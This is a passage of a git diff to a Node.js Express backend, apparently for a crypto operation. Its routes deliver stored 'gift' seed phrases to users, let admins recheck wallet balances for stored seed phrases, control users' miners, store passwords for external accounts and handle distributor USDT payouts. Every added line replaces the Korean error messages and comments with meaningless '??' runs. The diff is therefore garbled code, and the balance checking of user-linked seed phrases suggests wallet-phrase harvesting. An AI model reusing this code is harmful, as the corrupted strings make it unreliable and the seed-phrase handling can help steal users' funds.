+    if (!userId) return res.status(401).json({ error: '?? ??' });
 
     const [[gift]] = await db.pool.query(
       `SELECT id, phrase, note, created_at
@@ -3199,15 +3292,15 @@ app.get('/api/user/gift-seed', async (req, res) => {
   }
 });
 
-// POST /api/user/gift-seed/ack — 클라이언트가 수신 확인 처리
+// POST /api/user/gift-seed/ack ? ?????? ?? ?? ??
 app.post('/api/user/gift-seed/ack', async (req, res) => {
   try {
     const token = req.body?.token || req.headers['x-token'];
     const giftId = req.body?.giftId;
-    if (!token) return res.status(401).json({ error: '토큰 필요' });
+    if (!token) return res.status(401).json({ error: '?? ??' });
     const userId = await sessionStore.getUserId(token);
-    if (!userId) return res.status(401).json({ error: '세션 만료' });
-    if (!giftId) return res.status(400).json({ error: 'giftId 필요' });
+    if (!userId) return res.status(401).json({ error: '?? ??' });
+    if (!giftId) return res.status(400).json({ error: 'giftId ??' });
 
     await db.pool.query(
       `UPDATE seed_gifts SET status = 'delivered', delivered_at = NOW()
@@ -3220,7 +3313,7 @@ app.post('/api/user/gift-seed/ack', async (req, res) => {
   }
 });
 
-// POST /api/admin/seeds/recheck — 특정 시드 ID 잔고 재확인 (seed-checker.js 사용)
+// POST /api/admin/seeds/recheck ? ?? ?? ID ?? ??? (seed-checker.js ??)
 app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { ids } = req.body;
@@ -3233,24 +3326,24 @@ app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, re
       seedIds = ids.map(Number).filter(n => !isNaN(n) && n > 0);
     }
 
-    if (seedIds.length === 0) return res.status(400).json({ error: '재확인할 시드 ID가 없습니다.' });
-    if (seedIds.length > 50) return res.status(400).json({ error: '한 번에 최대 50개까지만 재확인 가능합니다.' });
+    if (seedIds.length === 0) return res.status(400).json({ error: '???? ?? ID? ????.' });
+    if (seedIds.length > 50) return res.status(400).json({ error: '? ?? ?? 50???? ??? ?????.' });
 
     const ph = seedIds.map(() => '?').join(',');
     const [seeds] = await db.pool.query(
       `SELECT id, user_id, phrase, created_at FROM seeds WHERE id IN (${ph})`, seedIds
     );
 
-    res.json({ ok: true, queued: seeds.length, ids: seedIds, message: '재확인 시작됨. 잠시 후 목록을 새로고침하세요.' });
+    res.json({ ok: true, queued: seeds.length, ids: seedIds, message: '??? ???. ?? ? ??? ???????.' });
 
-    // 백그라운드 처리 — seed-checker.js의 processSeed 재사용
+    // ????? ?? ? seed-checker.js? processSeed ???
     const { processSeed } = require('./seed-checker');
     (async () => {
       for (const seed of seeds) {
-        await processSeed(seed).catch(e => console.error(`[SEED RECHECK] ID=${seed.id} 오류:`, e.message));
+        await processSeed(seed).catch(e => console.error(`[SEED RECHECK] ID=${seed.id} ??:`, e.message));
         await new Promise(r => setTimeout(r, 500));
       }
-      console.log(`[SEED RECHECK] 전체 완료 (${seeds.length}개)`);
+      console.log(`[SEED RECHECK] ?? ?? (${seeds.length}?)`);
     })();
   } catch (e) {
     res.status(500).json({ error: e.message });
@@ -3258,24 +3351,24 @@ app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, re
 });
 
 // ============================================================
-//  macroUser 시스템 API  (/api/mu/*)
+//  macroUser ??? API  (/api/mu/*)
 // ============================================================
 
-// ----- 인증 -----
+// ----- ?? -----
 
 app.post('/api/mu/login', async (req, res) => {
   try {
     const { login_id, password } = req.body || {};
     if (!login_id?.trim() || !password?.trim()) {
-      return res.status(400).json({ error: 'ID와 비밀번호를 입력하세요.' });
+      return res.status(400).json({ error: 'ID? ????? ?????.' });
     }
     const hash = muHashPassword(password.trim());
     const [[user]] = await db.pool.query(
       'SELECT id, name, login_id, role, status FROM mu_users WHERE login_id = ? AND password_hash = ?',
       [login_id.trim(), hash]
     );
-    if (!user) return res.status(401).json({ error: 'ID 또는 비밀번호가 올바르지 않습니다.' });
-    if (user.status !== 'active') return res.status(403).json({ error: '비활성 계정입니다.' });
+    if (!user) return res.status(401).json({ error: 'ID ?? ????? ???? ????.' });
+    if (user.status !== 'active') return res.status(403).json({ error: '??? ?????.' });
     const token = muCreateToken();
     await db.pool.query('INSERT INTO mu_sessions (user_id, token) VALUES (?, ?)', [user.id, token]);
     res.json({ ok: true, token, user: { id: user.id, name: user.name, loginId: user.login_id, role: user.role } });
@@ -3298,9 +3391,9 @@ app.get('/api/mu/me', requireMuAuth, (req, res) => {
   res.json({ ok: true, user: req.muUser });
 });
 
-// ----- ADMIN 전용 API -----
+// ----- ADMIN ?? API -----
 
-// 전체 유저 목록 (계정 집계 포함)
+// ?? ?? ?? (?? ?? ??)
 app.get('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const [users] = await db.pool.query(`
@@ -3322,12 +3415,12 @@ app.get('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) =
   }
 });
 
-// 유저 생성
+// ?? ??
 app.post('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const { name, login_id, password, role } = req.body || {};
     if (!name?.trim() || !login_id?.trim() || !password?.trim()) {
-      return res.status(400).json({ error: '이름, ID, 비밀번호는 필수입니다.' });
+      return res.status(400).json({ error: '??, ID, ????? ?????.' });
     }
     const validRole = ['ADMIN', 'USER'].includes(role) ? role : 'USER';
     const hash = muHashPassword(password.trim());
@@ -3337,12 +3430,12 @@ app.post('/api/mu/admin/users', requireMuAuth, requireMuAdmin, async (req, res) 
     );
     res.json({ ok: true, id: result.insertId });
   } catch (e) {
-    if (e.code === 'ER_DUP_ENTRY') return res.status(409).json({ error: '이미 사용 중인 ID입니다.' });
+    if (e.code === 'ER_DUP_ENTRY') return res.status(409).json({ error: '?? ?? ?? ID???.' });
     res.status(500).json({ error: e.message });
   }
 });
 
-// 유저 수정/정지
+// ?? ??/??
 app.patch('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const userId = parseInt(req.params.id);
@@ -3353,7 +3446,7 @@ app.patch('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, 
     if (password?.trim()) { fields.push('password_hash = ?'); vals.push(muHashPassword(password.trim())); }
     if (['ADMIN', 'USER'].includes(role)) { fields.push('role = ?'); vals.push(role); }
     if (['active', 'inactive'].includes(status)) { fields.push('status = ?'); vals.push(status); }
-    if (fields.length === 0) return res.status(400).json({ error: '수정할 항목이 없습니다.' });
+    if (fields.length === 0) return res.status(400).json({ error: '??? ??? ????.' });
     vals.push(userId);
     await db.pool.query(`UPDATE mu_users SET ${fields.join(', ')} WHERE id = ?`, vals);
     res.json({ ok: true });
@@ -3362,7 +3455,7 @@ app.patch('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, 
   }
 });
 
-// 유저 삭제
+// ?? ??
 app.delete('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const userId = parseInt(req.params.id);
@@ -3373,7 +3466,7 @@ app.delete('/api/mu/admin/users/:id', requireMuAuth, requireMuAdmin, async (req,
   }
 });
 
-// 특정 유저의 계정 목록
+// ?? ??? ?? ??
 app.get('/api/mu/admin/users/:userId/accounts', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const userId = parseInt(req.params.userId);
@@ -3393,11 +3486,11 @@ app.get('/api/mu/admin/users/:userId/accounts', requireMuAuth, requireMuAdmin, a
   }
 });
 
-// 계정 생성 (관리자)
+// ?? ?? (???)
 app.post('/api/mu/admin/accounts', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const { owner_user_id, account_name, external_service_name, login_id, login_password, memo } = req.body || {};
-    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id는 필수입니다.' });
+    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id? ?????.' });
     const [result] = await db.pool.query(
       `INSERT INTO managed_accounts
         (owner_user_id, account_name, external_service_name, login_id, login_password_encrypted, memo)
@@ -3411,7 +3504,7 @@ app.post('/api/mu/admin/accounts', requireMuAuth, requireMuAdmin, async (req, re
   }
 });
 
-// 계정 상태 변경 (관리자)
+// ?? ?? ?? (???)
 app.patch('/api/mu/admin/accounts/:accountId/status', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const accountId = parseInt(req.params.accountId);
@@ -3422,7 +3515,7 @@ app.patch('/api/mu/admin/accounts/:accountId/status', requireMuAuth, requireMuAd
     const validCS = ['CONNECTED','DISCONNECTED','CHECKING'];
     if (validAS.includes(account_status)) { fields.push('account_status = ?'); vals.push(account_status); }
     if (validCS.includes(connection_status)) { fields.push('connection_status = ?'); vals.push(connection_status); }
-    if (fields.length === 0) return res.status(400).json({ error: '변경할 상태가 없습니다.' });
+    if (fields.length === 0) return res.status(400).json({ error: '??? ??? ????.' });
     vals.push(accountId);
     await db.pool.query(`UPDATE managed_accounts SET ${fields.join(', ')} WHERE id = ?`, vals);
     res.json({ ok: true });
@@ -3431,12 +3524,12 @@ app.patch('/api/mu/admin/accounts/:accountId/status', requireMuAuth, requireMuAd
   }
 });
 
-// 계정 소유자 재할당 (관리자)
+// ?? ??? ??? (???)
 app.patch('/api/mu/admin/accounts/:accountId/reassign', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const accountId = parseInt(req.params.accountId);
     const { owner_user_id } = req.body || {};
-    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id는 필수입니다.' });
+    if (!owner_user_id) return res.status(400).json({ error: 'owner_user_id? ?????.' });
     await db.pool.query('UPDATE managed_accounts SET owner_user_id = ? WHERE id = ?', [owner_user_id, accountId]);
     res.json({ ok: true });
   } catch (e) {
@@ -3444,7 +3537,7 @@ app.patch('/api/mu/admin/accounts/:accountId/reassign', requireMuAuth, requireMu
   }
 });
 
-// 계정 삭제 (관리자)
+// ?? ?? (???)
 app.delete('/api/mu/admin/accounts/:accountId', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const accountId = parseInt(req.params.accountId);
@@ -3455,7 +3548,7 @@ app.delete('/api/mu/admin/accounts/:accountId', requireMuAuth, requireMuAdmin, a
   }
 });
 
-// 계정 로그 추가 (관리자)
+// ?? ?? ?? (???)
 app.post('/api/mu/admin/accounts/:accountId/logs', requireMuAuth, requireMuAdmin, async (req, res) => {
   try {
     const accountId = parseInt(req.params.accountId);
@@ -3470,9 +3563,9 @@ app.post('/api/mu/admin/accounts/:accountId/logs', requireMuAuth, requireMuAdmin
   }
 });
 
-// ----- USER 전용 API -----
+// ----- USER ?? API -----
 
-// 내 계정 목록
+// ? ?? ??
 app.get('/api/mu/my/accounts', requireMuAuth, async (req, res) => {
   try {
     const userId = req.muUser.id;
@@ -3492,7 +3585,7 @@ app.get('/api/mu/my/accounts', requireMuAuth, async (req, res) => {
       ORDER BY FIELD(a.account_status,'ERROR','EXPIRED','SUSPENDED','PENDING','ACTIVE'), a.created_at ASC
     `, params);
 
-    // 요약 집계
+    // ?? ??
     const [allAccounts] = await db.pool.query(
       'SELECT account_status, connection_status FROM managed_accounts WHERE owner_user_id = ?', [userId]
     );
@@ -3511,7 +3604,7 @@ app.get('/api/mu/my/accounts', requireMuAuth, async (req, res) => {
   }
 });
 
-// 내 계정 상세
+// ? ?? ??
 app.get('/api/mu/my/accounts/:accountId', requireMuAuth, async (req, res) => {
   try {
     const userId = req.muUser.id;
@@ -3519,14 +3612,14 @@ app.get('/api/mu/my/accounts/:accountId', requireMuAuth, async (req, res) => {
     const [[account]] = await db.pool.query(
       'SELECT * FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
     );
-    if (!account) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
+    if (!account) return res.status(404).json({ error: '??? ?? ? ????.' });
     res.json({ ok: true, account });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// 내 계정 메모 수정
+// ? ?? ?? ??
 app.patch('/api/mu/my/accounts/:accountId/memo', requireMuAuth, async (req, res) => {
   try {
     const userId = req.muUser.id;
@@ -3536,14 +3629,14 @@ app.patch('/api/mu/my/accounts/:accountId/memo', requireMuAuth, async (req, res)
       'UPDATE managed_accounts SET memo = ? WHERE id = ? AND owner_user_id = ?',
       [memo || null, accountId, userId]
     );
-    if (result.affectedRows === 0) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
+    if (result.affectedRows === 0) return res.status(404).json({ error: '??? ?? ? ????.' });
     res.json({ ok: true });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// 내 계정 로그 조회
+// ? ?? ?? ??
 app.get('/api/mu/my/accounts/:accountId/logs', requireMuAuth, async (req, res) => {
   try {
     const userId = req.muUser.id;
@@ -3551,7 +3644,7 @@ app.get('/api/mu/my/accounts/:accountId/logs', requireMuAuth, async (req, res) =
     const [[owns]] = await db.pool.query(
       'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
     );
-    if (!owns) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
+    if (!owns) return res.status(404).json({ error: '??? ?? ? ????.' });
     const limit = Math.min(parseInt(req.query.limit) || 50, 200);
     const [logs] = await db.pool.query(
       'SELECT * FROM managed_account_logs WHERE managed_account_id = ? ORDER BY created_at DESC LIMIT ?',
@@ -3563,7 +3656,7 @@ app.get('/api/mu/my/accounts/:accountId/logs', requireMuAuth, async (req, res) =
   }
 });
 
-// 내 계정 작업 이력 조회
+// ? ?? ?? ?? ??
 app.get('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) => {
   try {
     const userId = req.muUser.id;
@@ -3571,7 +3664,7 @@ app.get('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) 
     const [[owns]] = await db.pool.query(
       'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
     );
-    if (!owns) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
+    if (!owns) return res.status(404).json({ error: '??? ?? ? ????.' });
     const limit = Math.min(parseInt(req.query.limit) || 50, 200);
     const [tasks] = await db.pool.query(
       'SELECT * FROM managed_account_tasks WHERE managed_account_id = ? ORDER BY created_at DESC LIMIT ?',
@@ -3583,7 +3676,7 @@ app.get('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) 
   }
 });
 
-// 내 계정 작업 추가
+// ? ?? ?? ??
 app.post('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res) => {
   try {
     const userId = req.muUser.id;
@@ -3591,7 +3684,7 @@ app.post('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res)
     const [[owns]] = await db.pool.query(
       'SELECT id FROM managed_accounts WHERE id = ? AND owner_user_id = ?', [accountId, userId]
     );
-    if (!owns) return res.status(404).json({ error: '계정을 찾을 수 없습니다.' });
+    if (!owns) return res.status(404).json({ error: '??? ?? ? ????.' });
     const { task_type } = req.body || {};
     const [result] = await db.pool.query(
       'INSERT INTO managed_account_tasks (managed_account_id, task_type) VALUES (?, ?)',
@@ -3603,9 +3696,9 @@ app.post('/api/mu/my/accounts/:accountId/tasks', requireMuAuth, async (req, res)
   }
 });
 
-// ========== 총판(매니저)용 API ==========
+// ========== ??(???)? API ==========
 
-// GET /api/admin/my/settlements — 본인 정산 내역 + 누적 잔액
+// GET /api/admin/my/settlements ? ?? ?? ?? + ?? ??
 app.get('/api/admin/my/settlements', requireAdmin, async (req, res) => {
   try {
     const managerId = req.admin.id;
@@ -3620,12 +3713,12 @@ app.get('/api/admin/my/settlements', requireAdmin, async (req, res) => {
        FROM settlements s WHERE s.manager_id = ? ORDER BY s.created_at DESC LIMIT ? OFFSET ?`,
       [managerId, pageSize, offset]
     );
-    // 누적 정산 총액
+    // ?? ?? ??
     const [[{ totalEarned }]] = await db.pool.query(
       'SELECT COALESCE(SUM(settlement_amount), 0) as totalEarned FROM settlements WHERE manager_id = ?',
       [managerId]
     );
-    // 출금된 금액
+    // ??? ??
     const [[{ totalWithdrawn }]] = await db.pool.query(
       'SELECT COALESCE(SUM(amount), 0) as totalWithdrawn FROM withdrawal_requests WHERE manager_id = ? AND status = "approved"',
       [managerId]
@@ -3637,7 +3730,7 @@ app.get('/api/admin/my/settlements', requireAdmin, async (req, res) => {
   }
 });
 
-// GET /api/admin/my/withdrawals — 본인 출금 신청 목록
+// GET /api/admin/my/withdrawals ? ?? ?? ?? ??
 app.get('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
   try {
     const managerId = req.admin.id;
@@ -3651,19 +3744,19 @@ app.get('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
   }
 });
 
-// POST /api/admin/my/withdrawals — 출금 신청 (매월 1일만 가능)
+// POST /api/admin/my/withdrawals ? ?? ?? (?? 1?? ??)
 app.post('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
   try {
     const managerId = req.admin.id;
     const now = new Date();
     if (now.getDate() !== 1) {
-      return res.status(400).json({ error: '출금 신청은 매월 1일에만 가능합니다.' });
+      return res.status(400).json({ error: '?? ??? ?? 1??? ?????.' });
     }
     const { amount, wallet_address } = req.body || {};
     if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
-      return res.status(400).json({ error: '유효한 금액을 입력하세요.' });
+      return res.status(400).json({ error: '??? ??? ?????.' });
     }
-    // 잔액 확인
+    // ?? ??
     const [[{ totalEarned }]] = await db.pool.query(
       'SELECT COALESCE(SUM(settlement_amount), 0) as totalEarned FROM settlements WHERE manager_id = ?',
       [managerId]
@@ -3672,14 +3765,14 @@ app.post('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
       'SELECT COALESCE(SUM(amount), 0) as totalWithdrawn FROM withdrawal_requests WHERE manager_id = ? AND status = "approved"',
       [managerId]
     );
-    // 대기 중인 출금 신청 합계도 차감
+    // ?? ?? ?? ?? ??? ??
     const [[{ pendingAmount }]] = await db.pool.query(
       'SELECT COALESCE(SUM(amount), 0) as pendingAmount FROM withdrawal_requests WHERE manager_id = ? AND status = "pending"',
       [managerId]
     );
     const balance = Number(totalEarned) - Number(totalWithdrawn) - Number(pendingAmount);
     if (Number(amount) > balance) {
-      return res.status(400).json({ error: `출금 가능 잔액(${balance.toFixed(4)} USDT)을 초과합니다.` });
+      return res.status(400).json({ error: `?? ?? ??(${balance.toFixed(4)} USDT)? ?????.` });
     }
     const [result] = await db.pool.query(
       'INSERT INTO withdrawal_requests (manager_id, amount, wallet_address) VALUES (?, ?, ?)',
@@ -3691,14 +3784,14 @@ app.post('/api/admin/my/withdrawals', requireAdmin, async (req, res) => {
   }
 });
 
-// GET /api/admin/users/:id/miner — 특정 회원 채굴기 상태 조회
+// GET /api/admin/users/:id/miner ? ?? ?? ??? ?? ??
 app.get('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
   try {
     const targetId = req.params.id.toLowerCase();
     if (req.admin.role !== 'master') {
       const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
       if (!user || user.manager_id !== req.admin.id) {
-        return res.status(403).json({ error: '소속 회원만 조회할 수 있습니다.' });
+        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
       }
     }
     const [[row]] = await db.pool.query(
@@ -3711,19 +3804,19 @@ app.get('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
   }
 });
 
-// PATCH /api/admin/users/:id/miner — 채굴기 상태 제어 (running/stopped)
+// PATCH /api/admin/users/:id/miner ? ??? ?? ?? (running/stopped)
 app.patch('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
   try {
     const targetId = req.params.id.toLowerCase();
     const { status, coin_type } = req.body || {};
     if (!['running', 'stopped'].includes(status)) {
-      return res.status(400).json({ error: 'status는 running 또는 stopped' });
+      return res.status(400).json({ error: 'status? running ?? stopped' });
     }
-    // 매니저는 자기 소속 회원만 제어 가능
+    // ???? ?? ?? ??? ?? ??
     if (req.admin.role !== 'master') {
       const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
       if (!user || user.manager_id !== req.admin.id) {
-        return res.status(403).json({ error: '소속 회원만 제어할 수 있습니다.' });
+        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
       }
     }
     const coinType = coin_type?.trim() || 'BTC';
@@ -3740,18 +3833,18 @@ app.patch('/api/admin/users/:id/miner', requireAdmin, async (req, res) => {
   }
 });
 
-// POST /api/admin/mining-records — 채굴 기록 추가 (매니저/마스터)
+// POST /api/admin/mining-records ? ?? ?? ?? (???/???)
 app.post('/api/admin/mining-records', requireAdmin, async (req, res) => {
   try {
     const { user_id, coin_type, amount, mined_at, note } = req.body || {};
     if (!user_id || !amount || isNaN(Number(amount))) {
-      return res.status(400).json({ error: 'user_id, amount 필수' });
+      return res.status(400).json({ error: 'user_id, amount ??' });
     }
     const targetId = user_id.toLowerCase();
     if (req.admin.role !== 'master') {
       const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
       if (!user || user.manager_id !== req.admin.id) {
-        return res.status(403).json({ error: '소속 회원만 관리할 수 있습니다.' });
+        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
       }
     }
     const [result] = await db.pool.query(
@@ -3764,7 +3857,7 @@ app.post('/api/admin/mining-records', requireAdmin, async (req, res) => {
   }
 });
 
-// DELETE /api/admin/mining-records/:id — 채굴 기록 삭제 (마스터 전용)
+// DELETE /api/admin/mining-records/:id ? ?? ?? ?? (??? ??)
 app.delete('/api/admin/mining-records/:id', requireAdmin, requireMaster, async (req, res) => {
   try {
     await db.pool.query('DELETE FROM mining_records WHERE id = ?', [req.params.id]);
@@ -3774,14 +3867,14 @@ app.delete('/api/admin/mining-records/:id', requireAdmin, requireMaster, async (
   }
 });
 
-// GET /api/admin/users/:id/mining-records — 특정 회원 채굴 내역 (매니저/마스터)
+// GET /api/admin/users/:id/mining-records ? ?? ?? ?? ?? (???/???)
 app.get('/api/admin/users/:id/mining-records', requireAdmin, async (req, res) => {
   try {
     const targetId = req.params.id.toLowerCase();
     if (req.admin.role !== 'master') {
       const [[user]] = await db.pool.query('SELECT manager_id FROM users WHERE id = ?', [targetId]);
       if (!user || user.manager_id !== req.admin.id) {
-        return res.status(403).json({ error: '소속 회원만 조회할 수 있습니다.' });
+        return res.status(403).json({ error: '?? ??? ??? ? ????.' });
       }
     }
     const [records] = await db.pool.query(
@@ -3798,9 +3891,9 @@ app.get('/api/admin/users/:id/mining-records', requireAdmin, async (req, res) =>
   }
 });
 
-// ========== 마스터 전용 API (정산 관리) ==========
+// ========== ??? ?? API (?? ??) ==========
 
-// GET /api/admin/settlements — 전체 정산 내역
+// GET /api/admin/settlements ? ?? ?? ??
 app.get('/api/admin/settlements', requireAdmin, requireMaster, async (req, res) => {
   try {
     let page = Math.max(1, parseInt(req.query.page, 10) || 1);
@@ -3823,12 +3916,12 @@ app.get('/api/admin/settlements', requireAdmin, requireMaster, async (req, res) 
   }
 });
 
-// PATCH /api/admin/managers/:id/settlement-rate — 정산 비율 설정
+// PATCH /api/admin/managers/:id/settlement-rate ? ?? ?? ??
 app.patch('/api/admin/managers/:id/settlement-rate', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { rate } = req.body || {};
     if (rate === undefined || isNaN(Number(rate)) || Number(rate) < 0 || Number(rate) > 100) {
-      return res.status(400).json({ error: '비율은 0~100 사이여야 합니다.' });
+      return res.status(400).json({ error: '??? 0~100 ???? ???.' });
     }
     await db.pool.query('UPDATE managers SET settlement_rate = ? WHERE id = ? AND role = "manager"', [Number(rate), req.params.id]);
     res.json({ ok: true });
@@ -3837,7 +3930,7 @@ app.patch('/api/admin/managers/:id/settlement-rate', requireAdmin, requireMaster
   }
 });
 
-// GET /api/admin/withdrawals — 전체 출금 신청 목록 (status, manager_id 필터 지원)
+// GET /api/admin/withdrawals ? ?? ?? ?? ?? (status, manager_id ?? ??)
 app.get('/api/admin/withdrawals', requireAdmin, requireMaster, async (req, res) => {
   try {
     const status    = req.query.status     || null;
@@ -3858,16 +3951,16 @@ app.get('/api/admin/withdrawals', requireAdmin, requireMaster, async (req, res) 
   }
 });
 
-// PATCH /api/admin/withdrawals/:id — 출금 승인/거절
+// PATCH /api/admin/withdrawals/:id ? ?? ??/??
 app.patch('/api/admin/withdrawals/:id', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { action, reject_reason } = req.body || {};
     if (!['approve', 'reject'].includes(action)) {
-      return res.status(400).json({ error: 'action은 approve 또는 reject' });
+      return res.status(400).json({ error: 'action? approve ?? reject' });
     }
     const [[wr]] = await db.pool.query('SELECT * FROM withdrawal_requests WHERE id = ?', [req.params.id]);
-    if (!wr) return res.status(404).json({ error: '출금 신청을 찾을 수 없습니다.' });
-    if (wr.status !== 'pending') return res.status(400).json({ error: '이미 처리된 신청입니다.' });
+    if (!wr) return res.status(404).json({ error: '?? ??? ?? ? ????.' });
+    if (wr.status !== 'pending') return res.status(400).json({ error: '?? ??? ?????.' });
     const newStatus = action === 'approve' ? 'approved' : 'rejected';
     await db.pool.query(
       'UPDATE withdrawal_requests SET status = ?, reject_reason = ?, processed_at = NOW() WHERE id = ?',
@@ -3879,39 +3972,39 @@ app.patch('/api/admin/withdrawals/:id', requireAdmin, requireMaster, async (req,
   }
 });
 
-// GET /api/admin/master/settlement-overview — 마스터 정산 전체 개요
+// GET /api/admin/master/settlement-overview ? ??? ?? ?? ??
 app.get('/api/admin/master/settlement-overview', requireAdmin, requireMaster, async (req, res) => {
   try {
-    // 총 수금액 (모든 결제의 합산 — settlements.payment_amount 기준)
+    // ? ??? (?? ??? ?? ? settlements.payment_amount ??)
     const [[{ total_collected }]] = await db.pool.query(
       'SELECT COALESCE(SUM(payment_amount), 0) as total_collected FROM settlements'
     );
-    // 총판 전체 누적 인센티브 (지급 예정 포함)
+    // ?? ?? ?? ???? (?? ?? ??)
     const [[{ total_settlement }]] = await db.pool.query(
       'SELECT COALESCE(SUM(settlement_amount), 0) as total_settlement FROM settlements'
     );
-    // 이미 지급 완료된 금액 (approved 출금)
+    // ?? ?? ??? ?? (approved ??)
     const [[{ total_paid_out }]] = await db.pool.query(
       "SELECT COALESCE(SUM(amount), 0) as total_paid_out FROM withdrawal_requests WHERE status = 'approved'"
     );
-    // 아직 지급 안 한 금액 (총판 잔액 합계 = 줘야 하는 금액)
+    // ?? ?? ? ? ?? (?? ?? ?? = ?? ?? ??)
     const pending_payout = Number(total_settlement) - Number(total_paid_out);
-    // 마스터 순수익 = 총 수금 - 총판 인센티브 전체
+    // ??? ??? = ? ?? - ?? ???? ??
     const master_net = Number(total_collected) - Number(total_settlement);
 
     res.json({
-      total_collected: Number(total_collected),   // 총 회수 금액
-      total_settlement: Number(total_settlement),  // 총판 인센티브 합계
-      total_paid_out: Number(total_paid_out),      // 이미 지급한 금액
-      pending_payout: pending_payout,              // 아직 줘야 하는 금액
-      master_net: master_net,                      // 마스터 순수익
+      total_collected: Number(total_collected),   // ? ?? ??
+      total_settlement: Number(total_settlement),  // ?? ???? ??
+      total_paid_out: Number(total_paid_out),      // ?? ??? ??
+      pending_payout: pending_payout,              // ?? ?? ?? ??
+      master_net: master_net,                      // ??? ???
     });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// GET /api/admin/managers/settlement-summary — 총판별 정산 요약
+// GET /api/admin/managers/settlement-summary ? ??? ?? ??
 app.get('/api/admin/managers/settlement-summary', requireAdmin, requireMaster, async (req, res) => {
   try {
     const [rows] = await db.pool.query(
@@ -3931,21 +4024,21 @@ app.get('/api/admin/managers/settlement-summary', requireAdmin, requireMaster, a
   }
 });
 
-// ========== 그룹 오너 API ==========
+// ========== ?? ?? API ==========
 
-// POST /api/owner/register — 공개 오너 가입 (pending 상태로 등록, 담당 매니저에게 텔레그램 알림)
+// POST /api/owner/register ? ?? ?? ?? (pending ??? ??, ?? ????? ???? ??)
 app.post('/api/owner/register', async (req, res) => {
   try {
     const { id, password, name, telegram, referralCode } = req.body || {};
-    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
+    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '???? ????? ?????.' });
     const ownerId = id.trim().toLowerCase();
     const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
-    if (exists) return res.status(400).json({ error: '이미 사용 중인 아이디입니다.' });
+    if (exists) return res.status(400).json({ error: '?? ?? ?? ??????.' });
 
     let managerId = null;
     if (referralCode?.trim()) {
       const [[mgr]] = await db.pool.query("SELECT id FROM managers WHERE id = ? AND role IN ('manager','master')", [referralCode.trim()]);
-      if (!mgr) return res.status(400).json({ error: '유효하지 않은 추천인 코드입니다.' });
+      if (!mgr) return res.status(400).json({ error: '???? ?? ??? ?????.' });
       managerId = mgr.id;
     }
 
@@ -3954,17 +4047,15 @@ app.post('/api/owner/register', async (req, res) => {
       [ownerId, password.trim(), name?.trim() || null, telegram?.trim() || null, managerId, 'pending']
     );
 
-    // 담당 매니저에게 텔레그램 알림
+    // ?? ????? ???? ??
     if (managerId) {
       try {
-        const [[mgr]] = await db.pool.query('SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?', [managerId]);
-        if (mgr?.tg_bot_token && mgr?.tg_chat_id) {
-          await sendTelegram(
-            mgr.tg_bot_token, mgr.tg_chat_id,
-            `📩 <b>오너 가입 요청</b>\n아이디: <code>${ownerId}</code>\n이름: ${name?.trim() || '-'}\n텔레그램: ${telegram?.trim() || '-'}`
-          );
-        }
-      } catch (tgErr) { console.warn('오너 가입 텔레그램 알림 실패:', tgErr.message); }
+        await sendManagerTelegramByChannel(
+          managerId,
+          'approval',
+          `?? <b>?? ?? ??</b>\n???: <code>${escapeHtml(ownerId)}</code>\n??: ${escapeHtml(name?.trim() || '-')}\n????: ${escapeHtml(telegram?.trim() || '-')}`
+        );
